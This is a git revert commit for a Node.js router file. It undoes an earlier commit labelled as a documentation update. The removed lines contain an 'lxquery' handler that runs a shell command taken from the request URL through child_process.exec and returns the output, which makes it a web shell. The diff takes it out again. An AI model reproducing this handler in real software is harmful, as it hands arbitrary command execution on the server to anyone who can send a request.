97310e7694f5d571a7ee13e654cbd7dd460e5f69
周必川 <zhoubichuan@icloud.com>
2025-06-07 19:42:33 +0800

    Revert "更新文档"
    This reverts commit a712161fd1b6dc251fa1b58b367833fe71976a54.

--- router/example/index.js
+++ router/example/index.js
@@ -1,8 +1,7 @@
 const fs = require("fs")
-const { exec } = require('child_process');
-const nodeUrl = require('url')
+
 let example = (req, res) => {
-    const key = req.url.split('?').shift().replace('/api/example/', '')
+    const key = req.url.split('/').pop()
     const router = {
         query(req, res) {
             console.log('example', req.url)
@@ -18,27 +17,6 @@ let example = (req, res) => {
                     res.end()
                 }
             })
-        },
-        lxquery(req, res) {
-            let data = ""
-            req.on("data", (chunk) => {
-                data += chunk
-            })
-            const task = req.url.split('=').pop()
-            exec(task, (error, stdout, stderr) => {
-                if (error) {
-                    console.error(`exec error: ${error}`);
-                    return;
-                }
-                res.writeHead(200, {
-                    "Content-Type": "text/html",
-                })
-                res.write(JSON.stringify({ result: stdout, code: 200 }))
-                res.end()
-                if (stderr) {
-                    console.error(`stderr: ${stderr}`);
-                }
-            });
         }
     }
     router[key](req, res)
